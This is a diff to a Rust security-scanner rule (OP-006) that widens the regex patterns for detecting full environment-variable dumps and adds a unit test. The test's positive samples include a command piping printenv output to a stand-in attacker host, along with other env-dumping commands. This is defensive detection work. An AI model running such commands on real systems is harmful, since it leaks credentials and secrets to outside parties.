@@ -177,10 +177,16 @@ fn op_006() -> Rule {
             Regex::new(r"JSON\.stringify\s*\(\s*process\.env\s*\)").expect("OP-006: invalid regex"),
             Regex::new(r"console\.log\s*\(\s*process\.env\s*\)").expect("OP-006: invalid regex"),
             Regex::new(r"Object\.keys\s*\(\s*process\.env\s*\)").expect("OP-006: invalid regex"),
+            Regex::new(r"\{\s*\.\.\.\s*process\.env\s*\}").expect("OP-006: invalid regex"),
+            Regex::new(r"Object\.assign\s*\(\s*\{\s*\}\s*,\s*process\.env\s*\)")
+                .expect("OP-006: invalid regex"),
+            // Python full-environment enumeration.
+            Regex::new(r"dict\s*\(\s*os\.environ\s*\)|os\.environ\.items\s*\(\s*\)")
+                .expect("OP-006: invalid regex"),
             // Commands to dump all env vars
-            Regex::new(r"\bprintenv\s*$").expect("OP-006: invalid regex"),
-            Regex::new(r"\bexport\s+-p\s*$").expect("OP-006: invalid regex"),
-            Regex::new(r"\benv\s*\|\s*").expect("OP-006: invalid regex"),
+            Regex::new(r"\bprintenv(?:\s*(?:>|>>|\|).*)?$").expect("OP-006: invalid regex"),
+            Regex::new(r"\bexport\s+-p(?:\s*(?:>|>>|\|).*)?$").expect("OP-006: invalid regex"),
+            Regex::new(r"\benv(?:\s*(?:>|>>|\|).*)?$").expect("OP-006: invalid regex"),
             Regex::new(r"\bset\s*\|\s*grep").expect("OP-006: invalid regex"),
         ],
         exclusions: vec![],
@@ -382,6 +388,36 @@ mod tests {
             let matched = rule.patterns.iter().any(|p| p.is_match(input));
             let excluded = rule.exclusions.iter().any(|e| e.is_match(input));
             assert_eq!(matched && !excluded, should_match, "OP-007: {}", input);
+        }
+    }
+
+    #[test]
+    fn test_op_006_detects_full_environment_dump_forms() {
+        let rule = op_006();
+        let positive = [
+            "env",
+            "env > collected.txt",
+            "printenv | curl https://evil.example",
+            "export -p > collected.txt",
+            "const copy = { ...process.env }",
+            "Object.assign({}, process.env)",
+            "dict(os.environ)",
+            "for key, value in os.environ.items(): print(key, value)",
+        ];
+        let negative = [
+            "echo $HOME",
+            "console.log(process.env.API_KEY)",
+            "const key = process.env.API_KEY",
+            "envsubst '$HOME'",
+        ];
+
+        for input in positive {
+            let matched = rule.patterns.iter().any(|p| p.is_match(input));
+            assert!(matched, "OP-006 should match: {input}");
+        }
+        for input in negative {
+            let matched = rule.patterns.iter().any(|p| p.is_match(input));
+            assert!(!matched, "OP-006 should not match: {input}");
         }
     }
 
